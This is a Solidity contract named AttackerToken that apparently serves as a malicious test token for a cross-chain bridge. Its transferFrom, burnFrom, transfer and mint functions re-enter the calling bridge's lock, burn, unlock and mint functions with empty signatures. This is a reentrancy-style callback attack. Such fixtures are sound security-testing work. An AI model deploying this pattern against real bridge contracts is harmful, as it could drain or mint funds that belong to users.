//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "../Token.sol";
import "../IBridge.sol";

contract AttackerToken is Token {
    constructor(
        string memory _name,
        string memory _symbol,
        address _owner
    ) Token(_name, _symbol, _owner) {}

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        IBridge.Signature memory _signature = IBridge.Signature(0, 0, "", "");
        IBridge(msg.sender).lock(
            to,
            address(this),
            amount,
            _signature
        );
        return true;
    }

    function burnFrom(address account, uint256 amount) public virtual override {
        IBridge.Signature memory _signature = IBridge.Signature(0, 0, "", "");
        IBridge(msg.sender).burn(
            account,
            address(this),
            amount,
            _signature
        );
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        IBridge(msg.sender).unlock(address(this), amount);
        return true;
    }

    function mint(address to, uint256 amount) external override {
        IBridge(msg.sender).mint(address(this), "WShark", "WShark", amount);
    }
}
